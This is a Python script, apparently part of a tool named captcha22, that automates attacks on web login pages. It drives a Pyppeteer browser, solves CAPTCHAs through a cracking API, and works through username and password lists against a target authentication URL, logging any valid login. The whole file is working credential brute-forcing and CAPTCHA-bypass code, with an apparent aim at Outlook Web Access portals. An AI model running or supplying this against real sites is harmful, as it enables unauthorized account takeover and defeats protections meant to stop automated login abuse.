#!/usr/bin/python3

import time
from pyppeteer import launch
import argparse
import asyncio
import logging

if __name__ == "__main__":
    from captcha_cracking import Cracker
else:
    from captcha22.lib.crackers.captcha import Cracker

class PyppeteerCracker:
    def __init__(self,
                 server_url="http://127.0.01", server_path="/captcha22/api/v1.0/", server_port="5000",
                 username=None, password=None, session_time=1800, use_hashes=False, use_filter=False,
                 use_local=False, input_dir="./input/", output="./output/", image_type="png", filter_low=130,
                 filter_high=142, captcha_id=None, check_captcha="What code is in the image",
                 check_login="Password", verify_login="The user name or password you entered isn't correct. Try entering it again",
                 username_field="username", password_field="password", captcha_field="ans", attacking_url=None, username_file=None, password_file=None, logger = logging.getLogger("Captcha22 Cracker")):

        self.logger = logger


        self.users = []
        self.passwords = []

        self.usernamefile = username_file
        self.passwordfile = password_file

        self.session_time = session_time

        if self.usernamefile == None:
            self.usernamefile = str(
                input("Please enter the path to the usernames file:"))

        if self.passwordfile == None:
            self.passwordfile = str(
                input("Please enter the path to the passwords file:"))

        lines = open(self.usernamefile).readlines()
        for line in lines:
            self.users.append(line.replace("\n", ""))

        lines = open(self.passwordfile).readlines()
        for line in lines:
            self.passwords.append(line.replace("\n", ""))

        self.attacking_url = attacking_url

        if self.attacking_url == None:
            self.attacking_url = str(
                input("Please enter the URL of the authentication page you want to automate:"))

        self.captcha_id = captcha_id
        self.check_captcha = check_captcha
        self.check_login = check_login
        self.verify_login = verify_login
        self.username_field = username_field
        self.password_field = password_field
        self.captcha_field = captcha_field

        self.cracker = Cracker(server_url, server_path, server_port, username, password, session_time, use_hashes, use_filter, use_local, input_dir, output, image_type, filter_low, filter_high, captcha_id, self.logger)

    async def check_on_captcha_page(self, page):
        check_for_captcha = self.check_captcha
        content = await page.evaluate('document.body.textContent', force_expr=True)
        if check_for_captcha in content:
            return True
        else:
            return False

    async def check_on_login_page(self, page):
        check_for_login = self.check_login
        content = await page.evaluate('document.body.textContent', force_expr=True)
        if check_for_login in content:
            return True
        else:
            return False

    async def check_login_failed(self, page):
        check_for_login = self.verify_login
        content = await page.evaluate('document.body.textContent', force_expr=True)
        if check_for_login in content:
            return True
        else:
            return False

    async def step(self):
        input("Enter to continue: ")

    async def login(self, page, username, password):
        self.logger.info("Testing user: "+str(username))

        await page.click('input[name='+self.username_field+']')
        time.sleep(0.1)
        await page.keyboard.down('Control')
        time.sleep(0.1)
        await page.keyboard.press('KeyA')
        time.sleep(0.1)
        await page.keyboard.up('Control')
        time.sleep(0.1)
        await page.keyboard.press('Backspace')
        time.sleep(0.1)
        await page.type('#'+self.username_field+'', username)
        time.sleep(0.1)
        await page.type('#'+self.password_field+'', password)
        time.sleep(0.1)
        await page.keyboard.press('Enter')
        await page.waitForNavigation()

        if await self.check_login_failed(page):
            self.logger.info("Login failed")
            return False
        else:
            if (await self.check_on_captcha_page(page)):
                self.logger.info("Back to captcha page")
                return False

        self.logger.info("VALID LOGIN ???")
        return True

    async def flow(self, page, username, password):
        await page.goto(self.attacking_url)
        while (await self.check_on_captcha_page(page)):
            self.logger.info("Waiting for captcha")
            img = await page.xpath('/html/body/img')
            img_source = await page.evaluate('(img) => img.src', img[0])

            # Send image to API
            captcha = self.cracker.solve_captcha_b64(img_source)

            self.logger.info("Submitting captcha as: " + str(captcha))
            await page.type('#'+self.captcha_field, captcha)
            await page.keyboard.press('Enter')
            time.sleep(0.5)

            # Wait for redirect to OWA
            await page.waitForNavigation()

            if await self.check_on_login_page(page):
                self.logger.info("CAPTCHA valid")
                cracker.get_captcha_feedback(True)

                # login
                await self.login(page, username, password)
            else:
                self.logger.info("Invalid CAPTCHA")
                cracker.get_captcha_feedback(False)

        self.logger.info("Didn't ask for captcha")
        await self.login(page, username, password)

    async def main(self):
        # Proxy can be used to debug: ,'--proxy-server=http://127.0.0.1:8080'])
        browser = await launch(headless=False, args=['--no-sandbox'])
        page = await browser.newPage()
        for user, passwd in zip(self.users, self.passwords):
            await self.flow(page, user, passwd)
        await browser.close()

    def norm_main(self):
        asyncio.get_event_loop().run_until_complete(self.main())


def normal_main():
    puppet = PyppeteerCracker()
    puppet.norm_main()


if __name__ == "__main__":

    normal_main()
